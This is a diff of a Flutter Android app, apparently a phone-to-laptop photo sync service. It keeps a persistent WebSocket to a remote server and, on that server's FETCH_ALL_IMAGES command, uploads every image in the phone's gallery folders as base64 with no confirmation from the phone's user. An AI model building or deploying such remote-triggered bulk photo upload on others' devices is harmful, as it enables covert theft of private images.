@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
+import 'package:flutter/foundation.dart';
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 
@@ -16,10 +17,9 @@ class RemotePulseApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'Remote Pulse Service',
-      theme: ThemeData(
-        colorScheme: ColorScheme.fromSeed(seedColor: Colors.green),
-        useMaterial3: true,
+      title: 'Remote Pulse Sync',
+      theme: ThemeData.dark().copyWith(
+        scaffoldBackgroundColor: const Color(0xFF121212),
       ),
       home: const MainHomeScreen(),
     );
@@ -43,40 +43,37 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
   int _totalImages = 0;
   int _uploadedImages = 0;
-  String _statusMessage = 'جاري التحقق من الاتصال والصلاحيات...';
+  String _statusMessage = 'جاري إعداد الخدمة...';
 
   WebSocket? _webSocket;
   Timer? _reconnectTimer;
+  Timer? _pingTimer;
   Completer<void>? _ackCompleter;
 
   @override
   void initState() {
     super.initState();
-    _initService();
+    _initPermissionsAndService();
   }
 
-  Future<void> _initService() async {
+  Future<void> _initPermissionsAndService() async {
     await _requestPermissions();
     _connectToCloudServer();
 
-    _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
-      if (!_isConnected && !_isConnecting) {
-        _connectToCloudServer();
-      }
+    _reconnectTimer = Timer.periodic(const Duration(seconds: 4), (_) {
+      if (!_isConnected && !_isConnecting) _connectToCloudServer();
     });
   }
 
-  Future<bool> _requestPermissions() async {
+  Future<void> _requestPermissions() async {
     if (Platform.isAndroid) {
-      Map<Permission, PermissionStatus> statuses = await [
+      await [
         Permission.storage,
         Permission.photos,
         Permission.manageExternalStorage,
         Permission.ignoreBatteryOptimizations,
       ].request();
-      return statuses.values.any((status) => status.isGranted);
     }
-    return true;
   }
 
   Future<void> _connectToCloudServer() async {
@@ -85,23 +82,31 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
     try {
       final wsUrl = 'wss://$serverDomain/ws/phone/$deviceId';
-      _webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 10));
+      _webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 8));
 
       if (mounted) {
         setState(() {
           _isConnected = true;
           _isConnecting = false;
-          _statusMessage = 'الخدمة شغالة في الخلفية ومتصلة\nجاهز لاستقبال الأوامر تلقائياً';
+          _statusMessage = 'الخدمة متصلة وجاهزة لتلقي الأوامر';
         });
       }
+
+      // إرسال نبضات قلب (Ping) كل 3 ثوانٍ لإبلاغ السيرفر واللابتوب بحالة الاتصال
+      _pingTimer?.cancel();
+      _pingTimer = Timer.periodic(const Duration(seconds: 3), (_) {
+        if (_isConnected && _webSocket != null) {
+          _webSocket?.add(jsonEncode({"type": "PING", "device_id": deviceId}));
+        }
+      });
 
       _webSocket?.listen(
         (data) {
           try {
             final message = jsonDecode(data);
             if (message['action'] == 'FETCH_ALL_IMAGES') {
-              // الموافقة والبدء التلقائي المباشر بدون تدخل
-              _syncAllImages();
+              List<String> existingFiles = List<String>.from(message['existing_files'] ?? []);
+              _syncAllImages(existingFiles);
             } else if (message['type'] == 'ACK_SAVED') {
               if (_ackCompleter != null && !_ackCompleter!.isCompleted) {
                 _ackCompleter!.complete();
@@ -120,18 +125,20 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
   void _handleDisconnect() {
     _isConnecting = false;
+    _pingTimer?.cancel();
     if (mounted) {
       setState(() {
         _isConnected = false;
-        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة آلياً...';
+        _statusMessage = 'تم انقطاع الاتصال، جاري المحاولة مجدداً...';
       });
     }
     _webSocket?.close();
     _webSocket = null;
   }
 
-  Future<List<File>> _getDeviceImages() async {
-    List<File> imageFiles = [];
+  // البحث عن الصور في الخلفية
+  static Future<List<String>> _scanImagesTask(void _) async {
+    List<String> imagePaths = [];
     List<String> targetDirs = [
       '/storage/emulated/0/DCIM',
       '/storage/emulated/0/Pictures',
@@ -140,113 +147,104 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
     for (var dirPath in targetDirs) {
       Directory dir = Directory(dirPath);
-      if (await dir.exists()) {
+      if (dir.existsSync()) {
         try {
           List<FileSystemEntity> files = dir.listSync(recursive: true, followLinks: false);
           for (var entity in files) {
-            if (entity is File && _isImageFile(entity.path)) {
-              imageFiles.add(entity);
+            if (entity is File) {
+              String ext = entity.path.toLowerCase();
+              if (ext.endsWith('.jpg') || ext.endsWith('.jpeg') || ext.endsWith('.png') || ext.endsWith('.webp')) {
+                imagePaths.add(entity.path);
+              }
             }
           }
         } catch (_) {}
       }
     }
-    return imageFiles;
+    return imagePaths;
   }
 
-  bool _isImageFile(String path) {
-    String ext = path.toLowerCase();
-    return ext.endsWith('.jpg') || ext.endsWith('.jpeg') || ext.endsWith('.png') || ext.endsWith('.webp');
-  }
-
-  Future<void> _syncAllImages() async {
+  Future<void> _syncAllImages(List<String> existingFiles) async {
     if (!_isConnected || _isSyncing) return;
 
-    bool hasPermission = await _requestPermissions();
-    if (!hasPermission) {
-      if (mounted) {
-        setState(() => _statusMessage = 'تم رفض إذن الوصول للصور!');
-      }
-      return;
-    }
-
-    if (mounted) {
-      setState(() {
-        _isSyncing = true;
-        _uploadedImages = 0;
-        _statusMessage = 'جاري نقل الصور تلقائياً إلى اللابتوب...';
-      });
-    }
+    setState(() {
+      _isSyncing = true;
+      _uploadedImages = 0;
+      _statusMessage = 'جاري مسح الصور في الخلفية...';
+    });
 
     try {
-      List<File> imageFiles = await _getDeviceImages();
+      // تشغيل المسح في Isolate لعدم تجميد الواجهة
+      List<String> imagePaths = await compute(_scanImagesTask, null);
+
+      // استبعاد الصور التي تم استلامها سابقاً باللابتوب (خاصية الاستئناف)
+      List<String> pendingImagePaths = imagePaths.where((path) {
+        String fileName = path.split('/').last;
+        return !existingFiles.contains(fileName);
+      }).toList();
 
       if (mounted) {
-        setState(() => _totalImages = imageFiles.length);
+        setState(() => _totalImages = pendingImagePaths.length);
       }
 
-      if (imageFiles.isEmpty) {
+      if (pendingImagePaths.isEmpty) {
         if (mounted) {
-          setState(() => _statusMessage = 'لم يتم العثور على أي صور لنقلها');
+          setState(() {
+            _statusMessage = 'جميع الصور منقولة بالفعل! لا يوجد جديد.';
+            _isSyncing = false;
+          });
         }
         return;
       }
 
-      for (var file in imageFiles) {
+      for (String path in pendingImagePaths) {
         if (!_isConnected) break;
 
         _ackCompleter = Completer<void>();
 
-        await _uploadSingleFile(file);
+        // قراءة ومعالجة الملف في Isolates
+        File file = File(path);
+        String fileName = path.split('/').last;
+        List<int> bytes = await file.readAsBytes();
+        String base64Image = await compute(base64Encode, bytes);
 
-        // الانتظار حتى استلام رد الحفظ من اللابتوب
-        await _ackCompleter!.future.timeout(
-          const Duration(seconds: 10),
-          onTimeout: () {},
-        );
+        _webSocket?.add(jsonEncode({
+          "type": "NEW_IMAGE_DATA",
+          "file_name": fileName,
+          "data": base64Image,
+        }));
 
-        // إضافة فاصل زمني (1 ثانية كاملة) لإراحة السيرفر وضمان الاستقرار
+        // الانتظار لتأكيد الحفظ من اللابتوب
+        await _ackCompleter!.future.timeout(const Duration(seconds: 8), onTimeout: () {});
+
+        // فاصل استقرار 1 ثانية
         await Future.delayed(const Duration(seconds: 1));
 
         if (mounted) {
           setState(() {
             _uploadedImages++;
+            _statusMessage = 'جاري النقل: $_uploadedImages / $_totalImages';
           });
         }
       }
     } catch (e) {
       if (mounted) {
-        setState(() => _statusMessage = 'حدث خطأ أثناء نقل الصور: $e');
+        setState(() => _statusMessage = 'حدث خطأ أثناء نقل الصور');
       }
     } finally {
       if (mounted) {
         setState(() {
           _isSyncing = false;
-          if (_uploadedImages > 0) {
-            _statusMessage = 'تم نقل جميع الصور بنجاح! ($_uploadedImages صورة)';
-          }
+          _statusMessage = 'اكتملت العملية بنجاح!';
         });
       }
     }
   }
 
-  Future<void> _uploadSingleFile(File file) async {
-    try {
-      List<int> imageBytes = await file.readAsBytes();
-      String base64Image = base64Encode(imageBytes);
-      String fileName = file.path.split('/').last;
-
-      _webSocket?.add(jsonEncode({
-        "type": "NEW_IMAGE_DATA",
-        "file_name": fileName,
-        "data": base64Image,
-      }));
-    } catch (_) {}
-  }
-
   @override
   void dispose() {
     _reconnectTimer?.cancel();
+    _pingTimer?.cancel();
     _webSocket?.close();
     super.dispose();
   }
@@ -254,16 +252,9 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      backgroundColor: const Color(0xFF121212),
-      appBar: AppBar(
-        title: const Text('Remote Background Sync', style: TextStyle(color: Colors.white, fontSize: 18)),
-        centerTitle: true,
-        backgroundColor: const Color(0xFF1E1E1E),
-        elevation: 0,
-      ),
       body: Center(
         child: Padding(
-          padding: const EdgeInsets.all(24.0),
+          padding: const EdgeInsets.all(20.0),
           child: Container(
             padding: const EdgeInsets.all(24.0),
             decoration: BoxDecoration(
@@ -274,45 +265,16 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
             child: Column(
               mainAxisSize: MainAxisSize.min,
               children: [
-                Row(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    Container(
-                      width: 12,
-                      height: 12,
-                      decoration: BoxDecoration(
-                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
-                        shape: BoxShape.circle,
-                      ),
-                    ),
-                    const SizedBox(width: 8),
-                    Text(
-                      _isConnected ? 'الخدمة نشطة ومستعدة' : 'غير متصل بالخادم',
-                      style: TextStyle(
-                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
-                        fontWeight: FontWeight.bold,
-                      ),
-                    ),
-                  ],
+                Icon(
+                  _isConnected ? Icons.cloud_done : Icons.cloud_off,
+                  size: 60,
+                  color: _isConnected ? Colors.greenAccent : Colors.redAccent,
                 ),
-                const SizedBox(height: 20),
-                Text(
-                  _statusMessage,
-                  textAlign: TextAlign.center,
-                  style: const TextStyle(fontSize: 14, color: Colors.white70),
-                ),
+                const SizedBox(height: 15),
+                Text(_statusMessage, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white, fontSize: 14)),
                 if (_isSyncing) ...[
-                  const SizedBox(height: 25),
-                  LinearProgressIndicator(
-                    value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
-                    color: Colors.greenAccent,
-                    backgroundColor: Colors.white10,
-                  ),
-                  const SizedBox(height: 12),
-                  Text(
-                    'تم نقل $_uploadedImages من أصل $_totalImages صورة',
-                    style: const TextStyle(color: Colors.white, fontSize: 13),
-                  )
+                  const SizedBox(height: 20),
+                  LinearProgressIndicator(value: _totalImages > 0 ? _uploadedImages / _totalImages : 0, color: Colors.greenAccent),
                 ]
               ],
             ),
